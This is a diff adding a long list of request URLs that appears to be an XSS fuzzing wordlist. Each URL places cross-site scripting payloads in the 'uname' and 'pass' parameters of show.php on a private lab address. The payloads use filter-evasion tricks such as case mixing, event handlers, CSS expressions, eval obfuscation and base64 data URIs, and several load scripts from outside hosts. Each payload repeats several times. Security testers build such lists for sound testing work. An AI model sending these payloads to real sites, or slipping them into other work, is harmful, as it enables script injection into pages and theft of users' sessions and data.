@@ -1,0 +1,300 @@
+http://192.168.32.130/show.php?uname=<script>alert('XSS!')</script>
+http://192.168.32.130/show.php?pass=<script>alert('XSS!')</script>
+http://192.168.32.130/show.php?uname=<script>alert('XSS!')</script>
+http://192.168.32.130/show.php?pass=<script>alert('XSS!')</script>
+http://192.168.32.130/show.php?uname=<script>var a = "</script> <script> alert('XSS !'); </script> <script>";</script>
+http://192.168.32.130/show.php?pass=<script>var a = "</script> <script> alert('XSS !'); </script> <script>";</script>
+http://192.168.32.130/show.php?uname=<script>var a = "</script> <script> alert('XSS !'); </script> <script>";</script>
+http://192.168.32.130/show.php?pass=<script>var a = "</script> <script> alert('XSS !'); </script> <script>";</script>
+http://192.168.32.130/show.php?uname=<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->
+http://192.168.32.130/show.php?pass=<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->
+http://192.168.32.130/show.php?uname=<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->
+http://192.168.32.130/show.php?pass=<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->
+http://192.168.32.130/show.php?uname=*/a=eval;b=alert;a(b(/e/.source));/*
+http://192.168.32.130/show.php?pass=*/a=eval;b=alert;a(b(/e/.source));/*
+http://192.168.32.130/show.php?uname=*/a=eval;b=alert;a(b(/e/.source));/*
+http://192.168.32.130/show.php?pass=*/a=eval;b=alert;a(b(/e/.source));/*
+http://192.168.32.130/show.php?uname=<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
+http://192.168.32.130/show.php?pass=<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
+http://192.168.32.130/show.php?uname=<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
+http://192.168.32.130/show.php?pass=<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
+http://192.168.32.130/show.php?uname=</TITLE><SCRIPT>alert("XSS");</SCRIPT>
+http://192.168.32.130/show.php?pass=</TITLE><SCRIPT>alert("XSS");</SCRIPT>
+http://192.168.32.130/show.php?uname=</TITLE><SCRIPT>alert("XSS");</SCRIPT>
+http://192.168.32.130/show.php?pass=</TITLE><SCRIPT>alert("XSS");</SCRIPT>
+http://192.168.32.130/show.php?uname=\";alert('XSS');//
+http://192.168.32.130/show.php?pass=\";alert('XSS');//
+http://192.168.32.130/show.php?uname=\";alert('XSS');//
+http://192.168.32.130/show.php?pass=\";alert('XSS');//
+http://192.168.32.130/show.php?uname=<<SCRIPT>alert("XSS");//<</SCRIPT>
+http://192.168.32.130/show.php?pass=<<SCRIPT>alert("XSS");//<</SCRIPT>
+http://192.168.32.130/show.php?uname=<<SCRIPT>alert("XSS");//<</SCRIPT>
+http://192.168.32.130/show.php?pass=<<SCRIPT>alert("XSS");//<</SCRIPT>
+http://192.168.32.130/show.php?uname=<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
+http://192.168.32.130/show.php?pass=<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
+http://192.168.32.130/show.php?uname=<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
+http://192.168.32.130/show.php?pass=<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
+http://192.168.32.130/show.php?uname=style=color: expression(alert(0));" a="
+http://192.168.32.130/show.php?pass=style=color: expression(alert(0));" a="
+http://192.168.32.130/show.php?uname=style=color: expression(alert(0));" a="
+http://192.168.32.130/show.php?pass=style=color: expression(alert(0));" a="
+http://192.168.32.130/show.php?uname=<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+http://192.168.32.130/show.php?pass=<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+http://192.168.32.130/show.php?uname=<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+http://192.168.32.130/show.php?pass=<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+http://192.168.32.130/show.php?uname=<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS
+http://192.168.32.130/show.php?pass=<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS
+http://192.168.32.130/show.php?uname=<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS
+http://192.168.32.130/show.php?pass=<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS
+http://192.168.32.130/show.php?uname=<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+http://192.168.32.130/show.php?pass=<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+http://192.168.32.130/show.php?uname=<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+http://192.168.32.130/show.php?pass=<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+http://192.168.32.130/show.php?uname=<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
+http://192.168.32.130/show.php?pass=<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
+http://192.168.32.130/show.php?uname=<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
+http://192.168.32.130/show.php?pass=<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
+http://192.168.32.130/show.php?uname=setTimeout// (name// ,0)
+http://192.168.32.130/show.php?pass=setTimeout// (name// ,0)
+http://192.168.32.130/show.php?uname=setTimeout// (name// ,0)
+http://192.168.32.130/show.php?pass=setTimeout// (name// ,0)
+http://192.168.32.130/show.php?uname=<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>
+http://192.168.32.130/show.php?pass=<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>
+http://192.168.32.130/show.php?uname=<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>
+http://192.168.32.130/show.php?pass=<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>
+http://192.168.32.130/show.php?uname=</noscript><br><code onmouseover=a=eval;b=alert;a(b(/h/.source));>MOVE MOUSE OVER THIS AREA</code>
+http://192.168.32.130/show.php?pass=</noscript><br><code onmouseover=a=eval;b=alert;a(b(/h/.source));>MOVE MOUSE OVER THIS AREA</code>
+http://192.168.32.130/show.php?uname=</noscript><br><code onmouseover=a=eval;b=alert;a(b(/h/.source));>MOVE MOUSE OVER THIS AREA</code>
+http://192.168.32.130/show.php?pass=</noscript><br><code onmouseover=a=eval;b=alert;a(b(/h/.source));>MOVE MOUSE OVER THIS AREA</code>
+http://192.168.32.130/show.php?uname=<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>
+http://192.168.32.130/show.php?pass=<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>
+http://192.168.32.130/show.php?uname=<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>
+http://192.168.32.130/show.php?pass=<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>
+http://192.168.32.130/show.php?uname=<? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?>
+http://192.168.32.130/show.php?pass=<? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?>
+http://192.168.32.130/show.php?uname=<? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?>
+http://192.168.32.130/show.php?pass=<? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?>
+http://192.168.32.130/show.php?uname=alert(1)
+http://192.168.32.130/show.php?pass=alert(1)
+http://192.168.32.130/show.php?uname=alert(1)
+http://192.168.32.130/show.php?pass=alert(1)
+http://192.168.32.130/show.php?uname=<SCRIPT>alert('XSS')</SCRIPT>
+http://192.168.32.130/show.php?pass=<SCRIPT>alert('XSS')</SCRIPT>
+http://192.168.32.130/show.php?uname=<SCRIPT>alert('XSS')</SCRIPT>
+http://192.168.32.130/show.php?pass=<SCRIPT>alert('XSS')</SCRIPT>
+http://192.168.32.130/show.php?uname=<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+http://192.168.32.130/show.php?pass=<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+http://192.168.32.130/show.php?uname=<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+http://192.168.32.130/show.php?pass=<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+http://192.168.32.130/show.php?uname=eval.call(this,unescape.call(this,location))
+http://192.168.32.130/show.php?pass=eval.call(this,unescape.call(this,location))
+http://192.168.32.130/show.php?uname=eval.call(this,unescape.call(this,location))
+http://192.168.32.130/show.php?pass=eval.call(this,unescape.call(this,location))
+http://192.168.32.130/show.php?uname=_=eval,__=unescape,___=document.URL,_(__(___))
+http://192.168.32.130/show.php?pass=_=eval,__=unescape,___=document.URL,_(__(___))
+http://192.168.32.130/show.php?uname=_=eval,__=unescape,___=document.URL,_(__(___))
+http://192.168.32.130/show.php?pass=_=eval,__=unescape,___=document.URL,_(__(___))
+http://192.168.32.130/show.php?uname=$_=document,$__=$_.URL,$___=unescape,$_=$_.body,$_.innerHTML = $___(http=$__)
+http://192.168.32.130/show.php?pass=$_=document,$__=$_.URL,$___=unescape,$_=$_.body,$_.innerHTML = $___(http=$__)
+http://192.168.32.130/show.php?uname=$_=document,$__=$_.URL,$___=unescape,$_=$_.body,$_.innerHTML = $___(http=$__)
+http://192.168.32.130/show.php?pass=$_=document,$__=$_.URL,$___=unescape,$_=$_.body,$_.innerHTML = $___(http=$__)
+http://192.168.32.130/show.php?uname=$=document,$=$.URL,$$=unescape,$$$=eval,$$$($$($))
+http://192.168.32.130/show.php?pass=$=document,$=$.URL,$$=unescape,$$$=eval,$$$($$($))
+http://192.168.32.130/show.php?uname=$=document,$=$.URL,$$=unescape,$$$=eval,$$$($$($))
+http://192.168.32.130/show.php?pass=$=document,$=$.URL,$$=unescape,$$$=eval,$$$($$($))
+http://192.168.32.130/show.php?uname=$=document,$=$.URL,$$=unescape,$$$=eval,$$$($$($))
+http://192.168.32.130/show.php?pass=$=document,$=$.URL,$$=unescape,$$$=eval,$$$($$($))
+http://192.168.32.130/show.php?uname=$=document,$=$.URL,$$=unescape,$$$=eval,$$$($$($))
+http://192.168.32.130/show.php?pass=$=document,$=$.URL,$$=unescape,$$$=eval,$$$($$($))
+http://192.168.32.130/show.php?uname=with(location)with(hash)eval(substring(1))
+http://192.168.32.130/show.php?pass=with(location)with(hash)eval(substring(1))
+http://192.168.32.130/show.php?uname=with(location)with(hash)eval(substring(1))
+http://192.168.32.130/show.php?pass=with(location)with(hash)eval(substring(1))
+http://192.168.32.130/show.php?uname=<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
+http://192.168.32.130/show.php?pass=<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
+http://192.168.32.130/show.php?uname=<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
+http://192.168.32.130/show.php?pass=<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
+http://192.168.32.130/show.php?uname=<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
+http://192.168.32.130/show.php?pass=<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
+http://192.168.32.130/show.php?uname=<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
+http://192.168.32.130/show.php?pass=<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
+http://192.168.32.130/show.php?uname=<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
+http://192.168.32.130/show.php?pass=<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
+http://192.168.32.130/show.php?uname=<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
+http://192.168.32.130/show.php?pass=<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
+http://192.168.32.130/show.php?uname=<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
+http://192.168.32.130/show.php?pass=<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
+http://192.168.32.130/show.php?uname=<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
+http://192.168.32.130/show.php?pass=<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
+http://192.168.32.130/show.php?uname=<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
+http://192.168.32.130/show.php?pass=<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
+http://192.168.32.130/show.php?uname=<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
+http://192.168.32.130/show.php?pass=<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
+http://192.168.32.130/show.php?uname=<TABLE BACKGROUND="javascript:alert('XSS')"></TABLE>
+http://192.168.32.130/show.php?pass=<TABLE BACKGROUND="javascript:alert('XSS')"></TABLE>
+http://192.168.32.130/show.php?uname=<TABLE BACKGROUND="javascript:alert('XSS')"></TABLE>
+http://192.168.32.130/show.php?pass=<TABLE BACKGROUND="javascript:alert('XSS')"></TABLE>
+http://192.168.32.130/show.php?uname=A=alert;A(1)
+http://192.168.32.130/show.php?pass=A=alert;A(1)
+http://192.168.32.130/show.php?uname=A=alert;A(1)
+http://192.168.32.130/show.php?pass=A=alert;A(1)
+http://192.168.32.130/show.php?uname=<TABLE><TD BACKGROUND="javascript:alert('XSS')"></TD></TABLE>
+http://192.168.32.130/show.php?pass=<TABLE><TD BACKGROUND="javascript:alert('XSS')"></TD></TABLE>
+http://192.168.32.130/show.php?uname=<TABLE><TD BACKGROUND="javascript:alert('XSS')"></TD></TABLE>
+http://192.168.32.130/show.php?pass=<TABLE><TD BACKGROUND="javascript:alert('XSS')"></TD></TABLE>
+http://192.168.32.130/show.php?uname=</textarea><br><code onmouseover=a=eval;b=alert;a(b(/g/.source));>MOVE MOUSE OVER THIS AREA</code>
+http://192.168.32.130/show.php?pass=</textarea><br><code onmouseover=a=eval;b=alert;a(b(/g/.source));>MOVE MOUSE OVER THIS AREA</code>
+http://192.168.32.130/show.php?uname=</textarea><br><code onmouseover=a=eval;b=alert;a(b(/g/.source));>MOVE MOUSE OVER THIS AREA</code>
+http://192.168.32.130/show.php?pass=</textarea><br><code onmouseover=a=eval;b=alert;a(b(/g/.source));>MOVE MOUSE OVER THIS AREA</code>
+http://192.168.32.130/show.php?uname='%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e'
+http://192.168.32.130/show.php?pass='%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e'
+http://192.168.32.130/show.php?uname='%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e'
+http://192.168.32.130/show.php?pass='%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e'
+http://192.168.32.130/show.php?uname=http://aa'><script>alert(123)</script>
+http://192.168.32.130/show.php?pass=http://aa'><script>alert(123)</script>
+http://192.168.32.130/show.php?uname=http://aa'><script>alert(123)</script>
+http://192.168.32.130/show.php?pass=http://aa'><script>alert(123)</script>
+http://192.168.32.130/show.php?uname=http://aa"><script>alert(123)</script>
+http://192.168.32.130/show.php?pass=http://aa"><script>alert(123)</script>
+http://192.168.32.130/show.php?uname=http://aa"><script>alert(123)</script>
+http://192.168.32.130/show.php?pass=http://aa"><script>alert(123)</script>
+http://192.168.32.130/show.php?uname=with(document.__parent__)alert(1)
+http://192.168.32.130/show.php?pass=with(document.__parent__)alert(1)
+http://192.168.32.130/show.php?uname=with(document.__parent__)alert(1)
+http://192.168.32.130/show.php?pass=with(document.__parent__)alert(1)
+http://192.168.32.130/show.php?uname=y=<a>alert</a>;content[y](123)
+http://192.168.32.130/show.php?pass=y=<a>alert</a>;content[y](123)
+http://192.168.32.130/show.php?uname=y=<a>alert</a>;content[y](123)
+http://192.168.32.130/show.php?pass=y=<a>alert</a>;content[y](123)
+http://192.168.32.130/show.php?uname=<? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?>
+http://192.168.32.130/show.php?pass=<? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?>
+http://192.168.32.130/show.php?uname=<? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?>
+http://192.168.32.130/show.php?pass=<? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?>
+http://192.168.32.130/show.php?uname=anythinglr00</script><script>alert(document.domain)</script>uxldz
+http://192.168.32.130/show.php?pass=anythinglr00</script><script>alert(document.domain)</script>uxldz
+http://192.168.32.130/show.php?uname=anythinglr00</script><script>alert(document.domain)</script>uxldz
+http://192.168.32.130/show.php?pass=anythinglr00</script><script>alert(document.domain)</script>uxldz
+http://192.168.32.130/show.php?uname=<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
+http://192.168.32.130/show.php?pass=<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
+http://192.168.32.130/show.php?uname=<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
+http://192.168.32.130/show.php?pass=<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
+http://192.168.32.130/show.php?uname=<script>alert(123);</script>
+http://192.168.32.130/show.php?pass=<script>alert(123);</script>
+http://192.168.32.130/show.php?uname=<script>alert(123);</script>
+http://192.168.32.130/show.php?pass=<script>alert(123);</script>
+http://192.168.32.130/show.php?uname=<ScRipT>alert("XSS");</ScRipT>
+http://192.168.32.130/show.php?pass=<ScRipT>alert("XSS");</ScRipT>
+http://192.168.32.130/show.php?uname=<ScRipT>alert("XSS");</ScRipT>
+http://192.168.32.130/show.php?pass=<ScRipT>alert("XSS");</ScRipT>
+http://192.168.32.130/show.php?uname=<script>alert(123)</script>
+http://192.168.32.130/show.php?pass=<script>alert(123)</script>
+http://192.168.32.130/show.php?uname=<script>alert(123)</script>
+http://192.168.32.130/show.php?pass=<script>alert(123)</script>
+http://192.168.32.130/show.php?uname=<script>alert("hellox worldss");</script>
+http://192.168.32.130/show.php?pass=<script>alert("hellox worldss");</script>
+http://192.168.32.130/show.php?uname=<script>alert("hellox worldss");</script>
+http://192.168.32.130/show.php?pass=<script>alert("hellox worldss");</script>
+http://192.168.32.130/show.php?uname=<script>alert(/XSS/)</script>
+http://192.168.32.130/show.php?pass=<script>alert(/XSS/)</script>
+http://192.168.32.130/show.php?uname=<script>alert(/XSS/)</script>
+http://192.168.32.130/show.php?pass=<script>alert(/XSS/)</script>
+http://192.168.32.130/show.php?uname=</script><script>alert(1)</script>
+http://192.168.32.130/show.php?pass=</script><script>alert(1)</script>
+http://192.168.32.130/show.php?uname=</script><script>alert(1)</script>
+http://192.168.32.130/show.php?pass=</script><script>alert(1)</script>
+http://192.168.32.130/show.php?uname=<ScRiPt>alert(1)</sCriPt>
+http://192.168.32.130/show.php?pass=<ScRiPt>alert(1)</sCriPt>
+http://192.168.32.130/show.php?uname=<ScRiPt>alert(1)</sCriPt>
+http://192.168.32.130/show.php?pass=<ScRiPt>alert(1)</sCriPt>
+http://192.168.32.130/show.php?uname=<img src=xss onerror=alert(1)>
+http://192.168.32.130/show.php?pass=<img src=xss onerror=alert(1)>
+http://192.168.32.130/show.php?uname=<img src=xss onerror=alert(1)>
+http://192.168.32.130/show.php?pass=<img src=xss onerror=alert(1)>
+http://192.168.32.130/show.php?uname=<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}
+http://192.168.32.130/show.php?pass=<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}
+http://192.168.32.130/show.php?uname=<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}
+http://192.168.32.130/show.php?pass=<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}
+http://192.168.32.130/show.php?uname=<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
+http://192.168.32.130/show.php?pass=<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
+http://192.168.32.130/show.php?uname=<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
+http://192.168.32.130/show.php?pass=<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
+http://192.168.32.130/show.php?uname=http://www.google<script .com>alert(document.location)</script
+http://192.168.32.130/show.php?pass=http://www.google<script .com>alert(document.location)</script
+http://192.168.32.130/show.php?uname=http://www.google<script .com>alert(document.location)</script
+http://192.168.32.130/show.php?pass=http://www.google<script .com>alert(document.location)</script
+http://192.168.32.130/show.php?uname=<script ^__^>alert(String.fromCharCode(49))</script ^__^
+http://192.168.32.130/show.php?pass=<script ^__^>alert(String.fromCharCode(49))</script ^__^
+http://192.168.32.130/show.php?uname=<script ^__^>alert(String.fromCharCode(49))</script ^__^
+http://192.168.32.130/show.php?pass=<script ^__^>alert(String.fromCharCode(49))</script ^__^
+http://192.168.32.130/show.php?uname=<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/
+http://192.168.32.130/show.php?pass=<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/
+http://192.168.32.130/show.php?uname=<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/
+http://192.168.32.130/show.php?pass=<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/
+http://192.168.32.130/show.php?uname=<script ~~~>alert(0%0)</script ~~~>
+http://192.168.32.130/show.php?pass=<script ~~~>alert(0%0)</script ~~~>
+http://192.168.32.130/show.php?uname=<script ~~~>alert(0%0)</script ~~~>
+http://192.168.32.130/show.php?pass=<script ~~~>alert(0%0)</script ~~~>
+http://192.168.32.130/show.php?uname=<div/style="width:expression(confirm(1))">X</div> {IE7}
+http://192.168.32.130/show.php?pass=<div/style="width:expression(confirm(1))">X</div> {IE7}
+http://192.168.32.130/show.php?uname=<div/style="width:expression(confirm(1))">X</div> {IE7}
+http://192.168.32.130/show.php?pass=<div/style="width:expression(confirm(1))">X</div> {IE7}
+http://192.168.32.130/show.php?uname=/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
+http://192.168.32.130/show.php?pass=/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
+http://192.168.32.130/show.php?uname=/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
+http://192.168.32.130/show.php?pass=/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
+http://192.168.32.130/show.php?uname=//|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\
+http://192.168.32.130/show.php?pass=//|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\
+http://192.168.32.130/show.php?uname=//|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\
+http://192.168.32.130/show.php?pass=//|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\
+http://192.168.32.130/show.php?uname=</plaintext\></|\><plaintext/onmouseover=prompt(1)
+http://192.168.32.130/show.php?pass=</plaintext\></|\><plaintext/onmouseover=prompt(1)
+http://192.168.32.130/show.php?uname=</plaintext\></|\><plaintext/onmouseover=prompt(1)
+http://192.168.32.130/show.php?pass=</plaintext\></|\><plaintext/onmouseover=prompt(1)
+http://192.168.32.130/show.php?uname=<iframe style="xg-p:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
+http://192.168.32.130/show.php?pass=<iframe style="xg-p:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
+http://192.168.32.130/show.php?uname=<iframe style="xg-p:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
+http://192.168.32.130/show.php?pass=<iframe style="xg-p:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
+http://192.168.32.130/show.php?uname=<embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
+http://192.168.32.130/show.php?pass=<embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
+http://192.168.32.130/show.php?uname=<embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
+http://192.168.32.130/show.php?pass=<embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
+http://192.168.32.130/show.php?uname=<object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
+http://192.168.32.130/show.php?pass=<object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
+http://192.168.32.130/show.php?uname=<object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
+http://192.168.32.130/show.php?pass=<object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
+http://192.168.32.130/show.php?uname=<var onmouseover="prompt(1)">On Mouse Over</var>
+http://192.168.32.130/show.php?pass=<var onmouseover="prompt(1)">On Mouse Over</var>
+http://192.168.32.130/show.php?uname=<var onmouseover="prompt(1)">On Mouse Over</var>
+http://192.168.32.130/show.php?pass=<var onmouseover="prompt(1)">On Mouse Over</var>
+http://192.168.32.130/show.php?uname=<img src="/" =_=" title="onerror='prompt(1)'">
+http://192.168.32.130/show.php?pass=<img src="/" =_=" title="onerror='prompt(1)'">
+http://192.168.32.130/show.php?uname=<img src="/" =_=" title="onerror='prompt(1)'">
+http://192.168.32.130/show.php?pass=<img src="/" =_=" title="onerror='prompt(1)'">
+http://192.168.32.130/show.php?uname=<%<!--'%><script>alert(1);</script -->
+http://192.168.32.130/show.php?pass=<%<!--'%><script>alert(1);</script -->
+http://192.168.32.130/show.php?uname=<%<!--'%><script>alert(1);</script -->
+http://192.168.32.130/show.php?pass=<%<!--'%><script>alert(1);</script -->
+http://192.168.32.130/show.php?uname=<script src="data:text/javascript,alert(1)"></script>
+http://192.168.32.130/show.php?pass=<script src="data:text/javascript,alert(1)"></script>
+http://192.168.32.130/show.php?uname=<script src="data:text/javascript,alert(1)"></script>
+http://192.168.32.130/show.php?pass=<script src="data:text/javascript,alert(1)"></script>
+http://192.168.32.130/show.php?uname=<iframe/src \/\/onload = prompt(1)
+http://192.168.32.130/show.php?pass=<iframe/src \/\/onload = prompt(1)
+http://192.168.32.130/show.php?uname=<iframe/src \/\/onload = prompt(1)
+http://192.168.32.130/show.php?pass=<iframe/src \/\/onload = prompt(1)
+http://192.168.32.130/show.php?uname=<iframe/onreadystatechange=alert(1)
+http://192.168.32.130/show.php?pass=<iframe/onreadystatechange=alert(1)
+http://192.168.32.130/show.php?uname=<iframe/onreadystatechange=alert(1)
+http://192.168.32.130/show.php?pass=<iframe/onreadystatechange=alert(1)
+http://192.168.32.130/show.php?uname=<svg/onload=alert(1)
+http://192.168.32.130/show.php?pass=<svg/onload=alert(1)
+http://192.168.32.130/show.php?uname=<svg/onload=alert(1)
+http://192.168.32.130/show.php?pass=<svg/onload=alert(1)
+http://192.168.32.130/show.php?uname=<input value=<><iframe/src=javascript:confirm(1)
+http://192.168.32.130/show.php?pass=<input value=<><iframe/src=javascript:confirm(1)
+http://192.168.32.130/show.php?uname=<input value=<><iframe/src=javascript:confirm(1)
+http://192.168.32.130/show.php?pass=<input value=<><iframe/src=javascript:confirm(1)
+http://192.168.32.130/show.php?uname=<input type="text" value=`` <div/onmouseover='alert(1)'>X</div>
+http://192.168.32.130/show.php?pass=<input type="text" value=`` <div/onmouseover='alert(1)'>X</div>
+http://192.168.32.130/show.php?uname=<input type="text" value=`` <div/onmouseover='alert(1)'>X</div>
+http://192.168.32.130/show.php?pass=<input type="text" value=`` <div/onmouseover='alert(1)'>X</div>
